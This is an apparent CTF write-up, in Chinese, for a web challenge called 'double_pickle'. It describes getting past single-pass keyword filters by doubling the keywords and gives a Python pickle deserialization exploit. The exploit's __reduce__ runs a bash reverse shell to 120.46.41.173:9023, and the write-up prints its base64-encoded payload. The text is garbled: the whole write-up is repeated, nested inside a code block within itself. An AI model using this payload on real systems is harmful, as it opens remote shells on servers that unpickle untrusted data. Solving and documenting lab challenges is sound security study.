## double_pickle


****

出题人：Jay17

![image-20240413222856596](C:\Users\26272\AppData\Roaming\Typora\typora-user-images\image-20240413222856596.png)

两个四位路由，爆破一下就是**/hint**和**/calc**

**/hint**路由回显如下：相当于给了源码，过滤替换很多，但是都是单次，可以双写绕过。



构造exp：(linux下执行)

````python
## double_pickle

****

出题人：Jay17

![descript](media/a094a8ce94a134467e41e39a66b400c0.png)

两个四位路由，爆破一下就是**/hint**和**/calc**

**/hint**路由回显如下：相当于给了源码，过滤替换很多，但是都是单次，可以双写绕过。

![descript](media/dd9deb210777114e2ecec999eb8a57cc.png)

构造exp：(linux下执行)

```python
import pickle
import os
import base64

class Jay17(): 
    def __reduce__(self):        
        return(os.system,('bash -c "bash -i >& /dev/tcp/120.46.41.173/9023 0>&1"',))   #反弹shell。因为这里无回显且无写入权限。

a= Jay17()
payload=pickle.dumps(a).replace(b'os', b'ooss').replace(b'reduce', b'redreduceuce').replace(b'system', b'syssystemtem').replace(b'env', b'enenvv').replace(b'flag', b'flflagag')   #双写绕过

payload=base64.b64encode(payload)    #base编码byte类
print(payload)
```

生成结果：（记得URL编码后再发送）

```
gASVUAAAAAAAAACMBXBvb3NzaXiUjAZzeXNzeXN0ZW10ZW2Uk5SMNWJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTIwLjQ2LjQxLjE3My85MDIzIDA+JjEilIWUUpQu

```

![descript](media/445023263e6b7e6510cde5fe544e1355.png)

![descript](media/2b5cb810c6b64d134f4a552473b5a286.png)


````

生成结果：（记得URL编码后再发送）

```
gASVUAAAAAAAAACMBXBvb3NzaXiUjAZzeXNzeXN0ZW10ZW2Uk5SMNWJhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTIwLjQ2LjQxLjE3My85MDIzIDA+JjEilIWUUpQu

```

![descript](media/445023263e6b7e6510cde5fe544e1355.png)

![descript](media/2b5cb810c6b64d134f4a552473b5a286.png)





